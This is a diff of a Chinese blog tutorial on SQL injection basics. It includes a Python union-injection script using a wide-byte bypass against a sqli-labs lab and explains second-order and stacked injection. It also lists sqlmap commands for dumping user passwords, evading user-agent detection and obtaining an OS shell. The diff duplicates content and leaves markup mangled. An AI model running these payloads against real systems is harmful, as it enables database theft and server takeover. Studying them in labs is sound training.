+                     data-src="images/e7f10d98b1fe54ea39c4b331e85b3823.png"
+                     
+alt="在这里插入图片描述" 
                 ></p>
-<h2 id="泄露原语-3"><a href="#泄露原语-3" class="headerlink" title="泄露原语"></a>泄露原语</h2><p>宽字节注入实际上只是一个闭合技巧，这里我实现了 union 注入的泄露原语。需要注意的是查询语句中不能有能被转义的字符，这里我通过将 <code>&quot;</code> 或 <code>&#39;</code> 包裹的字符串转换成 16 进制的数字来绕过。</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://172.30.211.208/sqli-labs/Less-32/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">replace_with_hex</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="comment"># 正则表达式匹配所有单引号或双引号内的内容</span></span><br><span class="line">    pattern = <span class="string">r&quot;([&#x27;\&quot;])(.*?)\1&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">text_to_hex</span>(<span class="params">text</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">ord</span>(c):02x&#125;</span>&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">replacer</span>(<span class="params"><span class="keyword">match</span></span>):</span><br><span class="line">        text_inside_quotes = <span class="keyword">match</span>.group(<span class="number">2</span>)</span><br><span class="line">        hex_representation = text_to_hex(text_inside_quotes)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;0x<span class="subst">&#123;hex_representation&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 替换所有匹配的文本</span></span><br><span class="line">    <span class="keyword">return</span> re.sub(pattern, replacer, s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">query_data</span>):</span><br><span class="line">    query_data = replace_with_hex(query_data)</span><br><span class="line">    html_content = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?id=-1%d8&#x27; union select 1,(<span class="subst">&#123;query_data&#125;</span>),3%23&quot;</span>).text</span><br><span class="line">    <span class="built_in">print</span>(html_content)</span><br><span class="line">    <span class="keyword">return</span> re.search(<span class="string">r&#x27;Your Login name:([^&lt;\s]+)&#x27;</span>, html_content).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">database = get_data(<span class="string">&#x27;database()&#x27;</span>)</span><br><span class="line">comumn_names = get_data(<span class="string">f&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;<span class="subst">&#123;database&#125;</span>&#x27;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(comumn_names)</span><br></pre></td></tr></table></figure></div>
-<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到 SQL 查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当 Web 程序调用存储在数据库中的恶意数据并执行 SQL 查询时，就发生了 SQL 二次注入。</p>
-<p>在第一次进行数据库插入数据的时候，仅仅只是使用了 <code>addslashes</code> 或者是借助 <code>get_magic_quotes_gpc</code> 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。</p>
+<h2 id="泄露原语-1">泄露原语</h2>
+<p>宽字节注入实际上只是一个闭合技巧，这里我实现了 union
+注入的泄露原语。需要注意的是查询语句中不能有能被转义的字符，这里我通过将
+<code>"</code> 或 <code>'</code> 包裹的字符串转换成 16
+进制的数字来绕过。 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://172.30.211.208/sqli-labs/Less-32/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">replace_with_hex</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="comment"># 正则表达式匹配所有单引号或双引号内的内容</span></span><br><span class="line">    pattern = <span class="string">r&quot;([&#x27;\&quot;])(.*?)\1&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">text_to_hex</span>(<span class="params">text</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">ord</span>(c):02x&#125;</span>&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">replacer</span>(<span class="params"><span class="keyword">match</span></span>):</span><br><span class="line">        text_inside_quotes = <span class="keyword">match</span>.group(<span class="number">2</span>)</span><br><span class="line">        hex_representation = text_to_hex(text_inside_quotes)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;0x<span class="subst">&#123;hex_representation&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 替换所有匹配的文本</span></span><br><span class="line">    <span class="keyword">return</span> re.sub(pattern, replacer, s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">query_data</span>):</span><br><span class="line">    query_data = replace_with_hex(query_data)</span><br><span class="line">    html_content = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?id=-1%d8&#x27; union select 1,(<span class="subst">&#123;query_data&#125;</span>),3%23&quot;</span>).text</span><br><span class="line">    <span class="built_in">print</span>(html_content)</span><br><span class="line">    <span class="keyword">return</span> re.search(<span class="string">r&#x27;Your Login name:([^&lt;\s]+)&#x27;</span>, html_content).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">database = get_data(<span class="string">&#x27;database()&#x27;</span>)</span><br><span class="line">comumn_names = get_data(<span class="string">f&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;<span class="subst">&#123;database&#125;</span>&#x27;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(comumn_names)</span><br></pre></td></tr></table></figure></div> # 二次注入
+二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到
+SQL
+查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当
+Web 程序调用存储在数据库中的恶意数据并执行 SQL 查询时，就发生了 SQL
+二次注入。</p>
+<p>在第一次进行数据库插入数据的时候，仅仅只是使用了
+<code>addslashes</code> 或者是借助 <code>get_magic_quotes_gpc</code>
+对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。</p>
 <p>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。</p>
-<p>二次注入的过程：</p>
-<ul>
-<li>先构造语句（此语句含有被转义字符的语句，如 <code>mysql_escape_string</code>、<code>mysql_real_escape_string</code> 转义）</li>
-<li>将我们构造的恶意语句存入数据库（被转义的语句）</li>
-<li>第二次构造语句（结合前面已被存入数据库的语句构造。因为系统没有对已存入的数据做检查，成功注入）</li>
-</ul>
+<p>二次注入的过程： - 先构造语句（此语句含有被转义字符的语句，如
+<code>mysql_escape_string</code>、<code>mysql_real_escape_string</code>
+转义） - 将我们构造的恶意语句存入数据库（被转义的语句） -
+第二次构造语句（结合前面已被存入数据库的语句构造。因为系统没有对已存入的数据做检查，成功注入）</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/9c61499d7d0369820e37ae28aa6ee48a.png"
-                      alt="在这里插入图片描述"
-                ></p>
-<h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>在 SQL 中， 分号（<code>;</code>） 是用来表示一条 sql 语句的结束。堆叠注入就是利用分号分隔语句实现多条 sql 语句的执行。</p>
-<p>堆叠注入的使用条件十分有限，其可能受到 API 或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条 sql 语句时才能够使用，利用 <code>mysqli_multi_query()</code> 函数就支持多条 sql 语句同时执行，但实际情况中，如 PHP 为了防止 sql 注入机制，往往使用调用数据库的函数是 <code>mysqli_ query()</code> 函数，其只能执行一条语句，分号后<br>面的内容将不会被执行。</p>
-<p>简单总结下来就是：</p>
-<ul>
-<li>目标存在 <code>sql</code> 注入漏洞。</li>
-<li>目标未对 <code>;</code> 号进行过滤。</li>
-<li>目标查询数据库信息时可同时执行多条 sql 语句。</li>
-</ul>
-<h1 id="sqlmap-使用"><a href="#sqlmap-使用" class="headerlink" title="sqlmap 使用"></a>sqlmap 使用</h1><h2 id="GET-型注入"><a href="#GET-型注入" class="headerlink" title="GET 型注入"></a>GET 型注入</h2><p>注入点在 URL 里称之为 GET 型注入。</p>
-<h3 id="单目标"><a href="#单目标" class="headerlink" title="单目标"></a>单目标</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://127.0.0.1/sqli/Less-1/?id=1&quot;</span><br><span class="line">sqlmap.py -u &quot;http://127.0.0.1/sqli/Less-1/?id=1&amp;page=10&quot; -p page --batch</span><br></pre></td></tr></table></figure></div>
-<ul>
-<li><code>-u</code>：指定 URL</li>
-<li><code>-p</code>：指定注入点</li>
-<li><code>--batch</code>：自动化测试，需要选择全部默认Y（注入过程可能比较久）<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://127.0.0.1/sqli/Less-1/?id=1&quot; --dbs</span><br><span class="line">sqlmap.py -u &quot;http://127.0.0.1/sqli/Less-1/?id=1&quot; -D security --tables</span><br><span class="line">sqlmap.py -u &quot;http://127.0.0.1/sqli/Less-1/?id=1&quot; -D security -T users --columns</span><br></pre></td></tr></table></figure></div></li>
-<li><code>--dbs</code>：获取数据库名</li>
-<li><code>--tables</code>：获取数据库表名</li>
-<li><code>--columns</code>：获取字段名</li>
-</ul>
+                     data-src="images/9c61499d7d0369820e37ae28aa6ee48a.png"
+                     
+alt="在这里插入图片描述" 
+                > # 堆叠注入 在 SQL 中，
+分号（<code>;</code>） 是用来表示一条 sql
+语句的结束。堆叠注入就是利用分号分隔语句实现多条 sql 语句的执行。</p>
+<p>堆叠注入的使用条件十分有限，其可能受到 API
+或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条 sql
+语句时才能够使用，利用 <code>mysqli_multi_query()</code> 函数就支持多条
+sql 语句同时执行，但实际情况中，如 PHP 为了防止 sql
+注入机制，往往使用调用数据库的函数是 <code>mysqli_ query()</code>
+函数，其只能执行一条语句，分号后 面的内容将不会被执行。</p>
+<p>简单总结下来就是： - 目标存在 <code>sql</code> 注入漏洞。 - 目标未对
+<code>;</code> 号进行过滤。 - 目标查询数据库信息时可同时执行多条 sql
+语句。</p>
+<h1 id="sqlmap-使用">sqlmap 使用</h1>
+<h2 id="get-型注入">GET 型注入</h2>
+<p>注入点在 URL 里称之为 GET 型注入。 ### 单目标 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://127.0.0.1/sqli/Less-1/?id=1&quot;</span><br><span class="line">sqlmap.py -u &quot;http://127.0.0.1/sqli/Less-1/?id=1&amp;page=10&quot; -p page --batch</span><br></pre></td></tr></table></figure></div> -
+<code>-u</code>：指定 URL - <code>-p</code>：指定注入点 -
+<code>--batch</code>：自动化测试，需要选择全部默认Y（注入过程可能比较久）
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://127.0.0.1/sqli/Less-1/?id=1&quot; --dbs</span><br><span class="line">sqlmap.py -u &quot;http://127.0.0.1/sqli/Less-1/?id=1&quot; -D security --tables</span><br><span class="line">sqlmap.py -u &quot;http://127.0.0.1/sqli/Less-1/?id=1&quot; -D security -T users --columns</span><br></pre></td></tr></table></figure></div> - <code>--dbs</code>：获取数据库名 -
+<code>--tables</code>：获取数据库表名 -
+<code>--columns</code>：获取字段名</p>
 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http://127.0.0.1/sqli/Less-1/?id=1 -D security -T users -C</span><br><span class="line">id,username,password --dump</span><br></pre></td></tr></table></figure></div>
 <ul>
-<li><code>--dump</code>：拖库</li>
+<li><code>--dump</code>：拖库 ### 多目标 把要测试的 URL 保存在 txt
+里，然后使用 <code>-m</code> 参数执行 txt 。 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -m test.txt</span><br></pre></td></tr></table></figure></div> ### 需要登录
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py –u http://test.com/index.php?id=1 --cookie &quot;name=xxx;sessid=abc&quot; –dbs</span><br></pre></td></tr></table></figure></div></li>
+<li><code>--cookie</code>：要测试的页面只有在登录状态下才能访问，登录状态用
+cookie 识别。</li>
 </ul>
-<h3 id="多目标"><a href="#多目标" class="headerlink" title="多目标"></a>多目标</h3><p>把要测试的 URL 保存在 txt 里，然后使用 <code>-m</code> 参数执行 txt 。</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -m test.txt</span><br></pre></td></tr></table></figure></div>
-<h3 id="需要登录"><a href="#需要登录" class="headerlink" title="需要登录"></a>需要登录</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py –u http://test.com/index.php?id=1 --cookie &quot;name=xxx;sessid=abc&quot; –dbs</span><br></pre></td></tr></table></figure></div>
-<ul>
-<li><code>--cookie</code>：要测试的页面只有在登录状态下才能访问，登录状态用 cookie 识别。</li>
-</ul>
-<p>GET 型注入 ua 头会带有明显的 Sqlmap 标识，可以使用 <code>--random-agent</code> 参数随机使用 User-agent 头，也可以自己指定 ua 头。</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http://test.com/index.php?id=1 --user-agent=&quot;Mozilla/4.0(compatible; MSIE 6.0; Windows NT 5.0; de) Opera 8.0&quot;</span><br></pre></td></tr></table></figure></div>
-<h2 id="POST-型注入"><a href="#POST-型注入" class="headerlink" title="POST 型注入"></a>POST 型注入</h2><p>注入点在 POST 数据里称之为 POST 型注入。</p>
-<p>将请求包抓取并保存到 txt 里</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py –r test.txt –p uname</span><br></pre></td></tr></table></figure></div>
-<ul>
-<li><code>-r</code>：指定目标文件</li>
-</ul>
-<h2 id="head-头注入"><a href="#head-头注入" class="headerlink" title="head 头注入"></a>head 头注入</h2><p>SQLmap 默认测试所有的 GET 和 POST 参数，当 <code>--level</code> 的值大于等于 2 的时候也会测试 HTTP Cookie 头的值，当大于等于 3 的时候也会测试 User-Agent 和 HTTP Referer 头的值。最高可到 5 。</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http://127.0.0.1/sqli/Less-20/index.php --cookie &quot;uname=Dumb&quot; --level 2 --dbs</span><br></pre></td></tr></table></figure></div>
-<ul>
-<li><code>--level</code>：指定测试等级</li>
-<li><code>--os-shell</code>：获取目标操作系统控制权，前提：<ul>
-<li>root 权限</li>
-<li><code>secure_file_priv</code> 配置为空（在 <code>my.ini</code> 里查看）</li>
-<li>知道网站的绝对路径</li>
-<li>有写的权限</li>
-</ul>
-</li>
-</ul>
+<p>GET 型注入 ua 头会带有明显的 Sqlmap 标识，可以使用
+<code>--random-agent</code> 参数随机使用 User-agent 头，也可以自己指定
+ua 头。 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http://test.com/index.php?id=1 --user-agent=&quot;Mozilla/4.0(compatible; MSIE 6.0; Windows NT 5.0; de) Opera 8.0&quot;</span><br></pre></td></tr></table></figure></div> ## POST 型注入 注入点在 POST 数据里称之为 POST
+型注入。</p>
+<p>将请求包抓取并保存到 txt 里 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py –r test.txt –p uname</span><br></pre></td></tr></table></figure></div> -
+<code>-r</code>：指定目标文件 ## head 头注入 SQLmap 默认测试所有的 GET
+和 POST 参数，当 <code>--level</code> 的值大于等于 2 的时候也会测试 HTTP
+Cookie 头的值，当大于等于 3 的时候也会测试 User-Agent 和 HTTP Referer
+头的值。最高可到 5 。 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http://127.0.0.1/sqli/Less-20/index.php --cookie &quot;uname=Dumb&quot; --level 2 --dbs</span><br></pre></td></tr></table></figure></div> -
+<code>--level</code>：指定测试等级 -
+<code>--os-shell</code>：获取目标操作系统控制权，前提： - root 权限 -
+<code>secure_file_priv</code> 配置为空（在 <code>my.ini</code> 里查看）
+- 知道网站的绝对路径 - 有写的权限</p>
 
         </div>
 
@@ -823,6 +914,21 @@
 
         
             <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2024/11/11/Java%20%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Java 安全基础</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
                 
                 
                     <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
@@ -907,7 +1013,7 @@
     <div class="post-toc">
         <div class="toc-title">On this page</div>
         <div class="page-title">SQL 注入基础</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80"><span class="nav-text">SQL 注入基础</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E7%BB%93%E6%9E%84"><span class="nav-text">数据库的结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#information-schema"><span class="nav-text">information_schema</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SCHEMATA-%E8%A1%A8"><span class="nav-text">SCHEMATA 表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TABLES-%E8%A1%A8"><span class="nav-text">TABLES 表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#COLUMNS-%E8%A1%A8"><span class="nav-text">COLUMNS 表</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9A%90%E5%BC%8F%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2"><span class="nav-text">隐式类型转换</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%92%8C%E6%95%B0%E5%80%BC%E4%B9%8B%E9%97%B4%E7%9A%84%E8%BD%AC%E6%8D%A2"><span class="nav-text">字符串和数值之间的转换</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E5%80%BC%E7%9A%84%E8%BD%AC%E6%8D%A2"><span class="nav-text">布尔值的转换</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MySQL-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"><span class="nav-text">MySQL 常见问题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL-%E6%B3%A8%E9%87%8A"><span class="nav-text">SQL 注释</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MySQL-%E6%B7%BB%E5%8A%A0%E6%97%A5%E5%BF%97"><span class="nav-text">MySQL 添加日志</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98"><span class="nav-text">编码问题</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-%E6%B3%A8%E5%85%A5%E4%B8%80%E8%88%AC%E8%BF%87%E7%A8%8B"><span class="nav-text">SQL 注入一般过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A3%80%E6%B5%8B%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-text">检测注入点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%BC%8F%E6%B4%9E%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8"><span class="nav-text">判断漏洞是否存在</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="nav-text">判断注入类型</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%8E%9F%E8%AF%AD"><span class="nav-text">构造信息泄露原语</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="nav-text">相关函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%99%AE%E9%80%9A%E6%B3%A8%E5%85%A5"><span class="nav-text">普通注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8"><span class="nav-text">盲注</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E4%BF%A1%E6%81%AF"><span class="nav-text">泄露信息</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0-1"><span class="nav-text">相关函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E8%BF%87%E7%A8%8B"><span class="nav-text">信息泄露过程</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="nav-text">联合查询注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E8%A1%A8%E4%B8%AD%E5%88%97%E6%95%B0"><span class="nav-text">判断表中列数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A1%AE%E5%AE%9A%E6%98%BE%E7%A4%BA%E4%BD%8D"><span class="nav-text">确定显示位</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E5%8E%9F%E8%AF%AD"><span class="nav-text">泄露原语</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-text">布尔盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5"><span class="nav-text">判断是否存在注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E6%95%B0%E5%AD%97"><span class="nav-text">泄露数字</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-text">泄露字符串</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-text">时间盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5-1"><span class="nav-text">判断是否存在注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E8%B6%85%E6%97%B6"><span class="nav-text">判断超时</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E6%95%B0%E5%AD%97-1"><span class="nav-text">泄露数字</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E5%AD%97%E7%AC%A6%E4%B8%B2-1"><span class="nav-text">泄露字符串</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-text">报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#xpath-%E8%AF%AD%E6%B3%95%E9%94%99%E8%AF%AF"><span class="nav-text">xpath 语法错误</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0-2"><span class="nav-text">相关函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E5%8E%9F%E8%AF%AD-1"><span class="nav-text">泄露原语</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%99%9A%E6%8B%9F%E8%A1%A8%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-text">虚拟表报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0-3"><span class="nav-text">相关函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="nav-text">基本原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" 